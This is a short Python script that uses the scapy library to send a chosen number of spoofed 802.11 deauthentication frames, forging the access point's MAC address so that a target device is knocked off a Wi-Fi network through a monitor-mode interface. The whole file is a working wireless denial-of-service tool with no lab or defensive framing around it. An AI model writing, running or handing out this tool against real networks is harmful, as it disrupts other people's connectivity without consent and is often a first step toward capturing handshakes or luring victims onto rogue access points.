import os
import argparse
from scapy.all import *

settings_file = "deauth_settings.txt"

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description="Send deauthentication packets")
parser.add_argument("-t", "--target", help="Target MAC address", required=True)
parser.add_argument("-g", "--gateway", help="Gateway (AP) MAC address", required=True)
parser.add_argument("-n", "--num-packets", help="Number of packets to send", type=int, required=True)
parser.add_argument("-i", "--interface", help="Interface to use (e.g., wlan1mon)", required=True)
args = parser.parse_args()

# Loop to send the specified number of deauth packets
for i in range(args.num_packets):
    # Construct the deauth packet targeting the device
    dot11 = Dot11(addr1=args.target, addr2=args.gateway, addr3=args.gateway)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=1, iface=args.interface, verbose=1)
